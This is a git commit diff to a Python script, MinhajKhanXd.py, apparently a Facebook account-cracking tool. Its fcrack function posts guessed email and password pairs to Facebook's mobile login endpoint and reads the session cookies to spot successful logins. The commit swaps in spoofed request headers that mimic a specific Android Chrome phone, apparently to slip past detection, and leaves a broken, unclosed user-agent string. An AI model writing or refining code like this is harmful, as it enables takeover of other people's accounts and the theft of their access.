2bc81ac95e755875a3f1395862d5a90eb94f04ac
MinhazulIslamMinhaj <143911340+MinhazulIslamMinhaj@users.noreply.github.com>
2023-09-07 13:23:51 +0600

    Add files via upload

--- MinhajKhanXd.py
+++ MinhajKhanXd.py
@@ -1099,7 +1099,7 @@ logo = """
 [•]YOUTUBE        : \033[1;32mMinhaj-Khan\033[1;37m
 [•]STATUS         : \033[1;32mFREE\033[1;37m
 --------------------------------------------------"""
- 
+
 def lines():
 	print('\33[1;37m--------------------------------------------------')
 loop = 0
@@ -1465,7 +1465,7 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-                        header_freefb = {'authority': 'm.facebook.com',
+                        header_freefb = {'authority': 'p.facebook.com',
  
 			'upgrade-insecure-requests': '1',
  
@@ -1475,33 +1475,23 @@ def fcrack(uid,pwx,tl):
  
 			'scheme': 'https',
  
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
- 
-			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
- 
-			'dnt':'1', 
- 
-			'x-requested-with':'mark.via.gp', 
- 
-			'sec-fetch-site': 'none',
- 
-			'sec-fetch-mode': 'navigate',
- 
-			'sec-fetch-user': '?1',
- 
-			'sec-fetch-dest': 'document',
- 
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
- 
-			'cache-control': 'max-age=0',
- 
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
- 
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
- 
-			"sec-ch-prefers-color-scheme": "light",
- 
-			'user-agent': pro}
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+           'accept-language': 'en-US,en;q=0.9',
+           'cache-control': 'max-age=0',
+           'dpr': '2',
+           'sec-ch-prefers-color-scheme': 'light',
+           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+           'sec-ch-ua-mobile': '?1',
+           'sec-ch-ua-model': '"Infinix X665B"',
+           'sec-ch-ua-platform': '"Android"',
+           'sec-ch-ua-platform-version': '"11.0.0"',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'none',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent': 'pro}
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
